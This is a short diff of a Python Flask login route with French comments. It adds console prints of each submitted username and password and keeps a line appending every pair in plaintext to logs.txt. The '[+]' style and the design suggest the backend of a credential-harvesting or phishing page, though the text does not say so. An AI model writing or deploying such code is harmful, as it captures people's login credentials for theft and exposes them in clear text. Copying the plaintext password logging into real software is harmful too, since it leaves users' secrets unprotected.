@@ -11,6 +11,10 @@ def login():
     username = request.form.get('username')
     password = request.form.get('password')
 
+    print(f"[+] Nom d'utilisateur reçu : {username}")
+    print(f"[+] Mot de passe reçu : {password}")
+
+    # Écriture dans logs.txt
     with open("logs.txt", "a") as f:
         f.write(f"username: {username}, password: {password}\n")
 
@@ -19,6 +23,6 @@ def login():
 if __name__ == '__main__':
     import os
     port = int(os.environ.get("PORT", 10000))
-    app.run(host='0.0.0.0', port=port, debug=True)
+    app.run(host='0.0.0.0', port=port)
 
 
